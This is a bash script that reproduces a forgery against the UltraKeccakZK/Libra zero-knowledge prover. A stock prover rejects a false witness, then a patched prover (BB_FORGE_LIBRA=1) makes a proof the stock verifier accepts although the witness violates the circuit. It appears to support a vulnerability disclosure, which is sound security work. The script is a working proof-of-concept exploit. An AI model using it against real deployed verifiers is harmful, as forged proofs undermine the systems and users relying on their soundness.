#!/usr/bin/env bash
# Reproduce the UltraKeccakZK Libra forgery from FORGERY.md / REPORT.md §7.
#
# Inputs (all checked into the repo):
#   circuits/simple_circuit/target/simple_circuit.json — compiled Noir circuit
#   circuits/simple_circuit/target/zk/vk                — verification key
#   forgery/false_witness.gz                            — witness with x = y = 2
#                                                        (violates assert(x != y))
#   forgery/bb-libra-forgery.patch                       — prover patch
#
# Environment:
#   BB_PATCHED  path to the patched bb binary   (default: /tmp/bb-forged/bin/bb)
#   BB_STOCK    path to a stock bb v0.87.0       (default: ~/.bb/bin/bb)
#
# Outputs:
#   forgery/forged/{proof,public_inputs}   — the forged proof (y = 2 public,
#                                            witness x = 2 violates the circuit)
#   forgery/false_honest/{proof,...}       — control: stock prover, same witness
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CIRCUIT_JSON="$ROOT/circuits/simple_circuit/target/simple_circuit.json"
VK="$ROOT/circuits/simple_circuit/target/zk/vk"
FALSE_WITNESS="$ROOT/forgery/false_witness.gz"
BB_PATCHED="${BB_PATCHED:-/tmp/bb-forged/bin/bb}"
BB_STOCK="${BB_STOCK:-$HOME/.bb/bin/bb}"

prove() { # $1 bb binary, $2 out dir, $3 extra env
  mkdir -p "$2"
  env $3 "$1" prove \
    --scheme ultra_honk \
    --oracle_hash keccak \
    --zk \
    --bytecode_path "$CIRCUIT_JSON" \
    --witness_path "$FALSE_WITNESS" \
    --output_path "$2" \
    --output_format bytes_and_fields >/dev/null
  cp "$VK" "$2/vk"
}

echo "[1/3] stock prover, false witness (control; the proof must NOT verify)"
prove "$BB_STOCK" "$ROOT/forgery/false_honest" ""
if "$BB_STOCK" verify --scheme ultra_honk --oracle_hash keccak --zk \
     --proof_path "$ROOT/forgery/false_honest/proof" \
     --public_inputs_path "$ROOT/forgery/false_honest/public_inputs" \
     --vk_path "$VK" >/dev/null 2>&1; then
  echo "control proof unexpectedly verified" >&2
  exit 1
fi
echo "      rejected, as expected"

echo "[2/3] patched prover (BB_FORGE_LIBRA=1), same false witness"
prove "$BB_PATCHED" "$ROOT/forgery/forged" "BB_FORGE_LIBRA=1"

echo "[3/3] verifying the forged proof with the stock bb verifier"
"$BB_STOCK" verify --scheme ultra_honk --oracle_hash keccak --zk \
  --proof_path "$ROOT/forgery/forged/proof" \
  --public_inputs_path "$ROOT/forgery/forged/public_inputs" \
  --vk_path "$VK"
echo "forged proof verified: witness violates assert(x != y), verifier accepted"
